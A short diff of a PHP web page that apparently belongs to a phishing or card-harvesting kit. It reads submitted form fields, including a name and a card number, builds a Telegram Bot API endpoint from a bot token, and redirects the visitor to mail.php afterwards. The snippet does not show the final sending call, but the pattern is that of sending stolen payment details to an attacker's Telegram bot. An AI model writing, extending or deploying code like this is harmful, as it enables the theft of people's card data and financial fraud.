@@ -10,8 +10,9 @@
     <link rel="stylesheet" href="output.css">
     <?php
                     if (isset($_POST['submit'])) {
+                        require './form.php';
                         header('Location: mail.php');
-                        require 'form.php';
+                        echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $URL . "/mail.php" . '">';
                         define('url', "https://api.telegram.org/bot".$token.'/');
                         $name = $_POST['fname'];
                         $card = $_POST['card'];
